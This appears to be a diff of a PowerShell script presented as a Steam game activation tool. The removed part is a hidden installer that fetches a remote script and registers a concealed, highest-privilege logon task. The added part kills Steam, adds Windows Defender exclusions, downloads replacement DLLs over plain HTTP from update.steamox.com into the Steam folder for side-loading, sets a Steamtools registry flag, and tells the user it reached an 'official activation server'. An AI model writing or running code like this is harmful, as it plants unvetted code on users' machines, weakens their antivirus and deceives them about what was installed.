@@ -1,33 +1,143 @@
-# ===== INSTALL SCRIPT - Hidden Version =====
+cls
+[Console]::InputEncoding = [System.Text.Encoding]::UTF8
 
-$ScriptUrl = "https://raw.githubusercontent.com/sam12345z/K55STORE/refs/heads/main/SteamManifestAuto.ps1"
-$InstallPath = "$env:APPDATA\SteamManifestAuto"
-$ScriptFile = "$InstallPath\SteamManifestAuto.ps1"
-$LogFile = "$InstallPath\install.log"
-$TaskName = "SteamManifestAuto"
+$localPath = Join-Path $env:LOCALAPPDATA "steam"
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
+$steamPath = ""
 
-# إنشاء المجلد إذا لم يكن موجودًا
-if (-not (Test-Path $InstallPath)) { New-Item -ItemType Directory -Path $InstallPath | Out-Null }
-
-# تسجيل الحدث في ملف السجل
-"[$(Get-Date)] Starting installation..." | Out-File -FilePath $LogFile -Append
-
-# تحميل السكربت الرئيسي من GitHub
-Invoke-WebRequest -Uri $ScriptUrl -OutFile $ScriptFile
-
-"[$(Get-Date)] Downloaded SteamManifestAuto.ps1" | Out-File -FilePath $LogFile -Append
-
-# حذف أي مهمة مجدولة قديمة بنفس الاسم
-$oldTasks = Get-ScheduledTask | Where-Object {$_.TaskName -eq $TaskName}
-foreach ($t in $oldTasks) {
-    Unregister-ScheduledTask -TaskName $t.TaskName -Confirm:$false
-    "[$(Get-Date)] Removed old scheduled task: $($t.TaskName)" | Out-File -FilePath $LogFile -Append
+function Remove-ItemIfExists($path) {
+    if (Test-Path $path) {
+        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+    }
 }
 
-# إنشاء مهمة مجدولة لتشغيل السكربت مخفي
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptFile`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
+function ForceStopProcess($processName) {
+    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2 
+    if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
+}
 
-Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -RunLevel Highest -Force
+function CheckAndPromptProcess($processName, $message) {
+    while (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Write-Host $message -ForegroundColor Red
+        Start-Sleep 1.5
+    }
+}
 
-"[$(Get-Date)] Installation completed successfully. Task scheduled and running hidden." | Out-File -FilePath $LogFile -Append
+$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
+Remove-ItemIfExists $filePathToDelete
+
+ForceStopProcess "steam"
+if (Get-Process "steam" -ErrorAction SilentlyContinue) {
+    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
+}
+
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
+        $steamPath = $properties.SteamPath
+    }
+}
+if ([string]::IsNullOrWhiteSpace($steamPath)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+if (-not (Test-Path $steamPath -PathType Container)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+$steamConfigPath = Join-Path $steamPath "config"
+$hidPath = Join-Path $steamPath "xinput1_4.dll"
+Remove-ItemIfExists $hidPath
+
+$xinputPath = Join-Path $steamPath "user32.dll"
+Remove-ItemIfExists $xinputPath
+
+function PwStart() {
+    try {
+        if (!$steamPath) {
+            return
+        }
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
+        }
+        
+        $steamCfgPath = Join-Path $steamPath "steam.cfg"
+        Remove-ItemIfExists $steamCfgPath
+        
+        $steamBetaPath = Join-Path $steamPath "package\beta"
+        Remove-ItemIfExists $steamBetaPath
+        
+        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+        Remove-ItemIfExists $catchPath
+        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+        
+        $versionDllPath = Join-Path $steamPath "version.dll"
+        Remove-ItemIfExists $versionDllPath
+        
+        $downloadHidDll = "http://update.steamox.com/update"
+        
+        try {
+            Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $hidPath) {
+                Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction SilentlyContinue
+            }
+        }
+        
+        $dwmapiPath = Join-Path $steamPath "dwmapi.dll"
+        $downloadDwmapi = "http://update.steamox.com/dwmapi"
+        try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}
+        try {
+            Invoke-RestMethod -Uri $downloadDwmapi -OutFile $dwmapiPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $dwmapiPath) {
+                Move-Item -Path $dwmapiPath -Destination "$dwmapiPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadDwmapi -OutFile $dwmapiPath -ErrorAction SilentlyContinue
+            }
+        }
+        
+        if (!(Test-Path $steamToolsRegPath)) {
+            New-Item -Path $steamToolsRegPath -Force | Out-Null
+        }
+        
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
+        
+        Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String
+        
+        $steamExePath = Join-Path $steamPath "steam.exe"
+        Start-Process $steamExePath
+        Start-Process "steam://"
+        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
+
+        for ($i = 5; $i -ge 0; $i--) {
+            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
+            Start-Sleep -Seconds 1
+        }
+        
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
+        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
+            $parentProcessId = $instance.ProcessId
+            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
+        }
+        if ($null -ne $parentProcessId) {
+            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+        }
+        
+        exit
+        
+    } catch {
+    }
+}
+
+PwStart
